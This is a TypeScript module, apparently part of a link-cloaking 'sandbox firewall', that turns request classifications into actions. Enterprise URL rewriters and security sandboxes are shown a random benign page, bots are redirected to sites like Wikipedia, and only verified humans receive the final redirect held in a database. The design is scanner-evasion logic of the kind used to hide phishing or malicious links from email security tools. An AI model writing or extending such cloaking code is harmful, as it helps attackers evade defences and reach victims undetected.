/**
 * MASTER SANDBOX FIREWALL - Action Engine
 * Phase 5.7: Convert classification → action decision
 */

import { FIREWALL_CONFIG, getRandomSafeRedirect } from './config'
import { getRandomTemplate } from '../benignTemplates'
import type { ClassificationResult, RequestClassification } from './classifier'

export type FirewallAction = 
  | 'benign'      // Serve benign template
  | 'redirect'    // Serve final redirect (from DB)
  | 'captcha'     // Force CAPTCHA challenge
  | 'safe'        // Safe redirect (Wikipedia, Amazon, etc.)
  | 'block'       // Block request (403)

export interface FirewallActionResult {
  action: FirewallAction
  templateId?: string
  redirectUrl?: string
  reason: string[]
  classification: RequestClassification
  skipAttemptIncrement?: boolean
  skipTokenBurn?: boolean
  skipBehavioralChecks?: boolean
  lockToken?: boolean
}

/**
 * Convert classification result to action
 */
export function determineAction(
  classification: ClassificationResult,
  fingerprint?: string
): FirewallActionResult {
  const { type, reasons, score } = classification
  
  switch (type) {
    case 'rewritten':
      // Enterprise URL rewriter detected
      // Always serve benign template, never redirect to final URL
      const template1 = getRandomTemplate(fingerprint)
      return {
        action: 'benign',
        templateId: template1.id,
        reason: ['Enterprise URL rewriter detected - serving benign template'],
        classification: 'rewritten',
        skipAttemptIncrement: true,
        skipTokenBurn: true,
        skipBehavioralChecks: true,
      }
    
    case 'sandbox_high':
    case 'sandbox_low':
      // Sandbox detected (high or low confidence)
      // Serve benign template, do not increment attempts, do not burn token
      const template2 = getRandomTemplate(fingerprint)
      return {
        action: 'benign',
        templateId: template2.id,
        reason: [`Sandbox detected (${type}): ${reasons.slice(0, 2).join(', ')}`],
        classification: type,
        skipAttemptIncrement: true,
        skipTokenBurn: true,
        skipBehavioralChecks: true,
      }
    
    case 'human_verified':
      // Human verified - serve final redirect
      return {
        action: 'redirect',
        reason: ['Human verified - allow final redirect'],
        classification: 'human_verified',
        skipAttemptIncrement: false,
        skipTokenBurn: false,
        skipBehavioralChecks: false,
      }
    
    case 'unknown_risk':
      // Unknown risk - require CAPTCHA
      return {
        action: 'captcha',
        reason: ['Unknown risk - CAPTCHA required'],
        classification: 'unknown_risk',
        skipAttemptIncrement: false,
        skipTokenBurn: false,
        skipBehavioralChecks: false,
      }
    
    case 'bot_harmful':
      // Harmful bot - safe redirect
      return {
        action: 'safe',
        redirectUrl: getRandomSafeRedirect(),
        reason: [`Harmful bot detected: ${reasons.slice(0, 1).join(', ')}`],
        classification: 'bot_harmful',
        skipAttemptIncrement: true,
        skipTokenBurn: true,
        skipBehavioralChecks: true,
      }
    
    case 'bot_auto':
      // Automated bot - safe redirect
      return {
        action: 'safe',
        redirectUrl: getRandomSafeRedirect(),
        reason: [`Automated bot detected: ${reasons.slice(0, 1).join(', ')}`],
        classification: 'bot_auto',
        skipAttemptIncrement: true,
        skipTokenBurn: true,
        skipBehavioralChecks: true,
      }
    
    case 'vpn_or_proxy':
      // VPN or proxy - require CAPTCHA
      return {
        action: 'captcha',
        reason: ['VPN or proxy detected - CAPTCHA required'],
        classification: 'vpn_or_proxy',
        skipAttemptIncrement: false,
        skipTokenBurn: false,
        skipBehavioralChecks: false,
      }
    
    default:
      // Default: unknown risk
      return {
        action: 'captcha',
        reason: ['Unknown classification - CAPTCHA required'],
        classification: 'unknown_risk',
        skipAttemptIncrement: false,
        skipTokenBurn: false,
        skipBehavioralChecks: false,
      }
  }
}






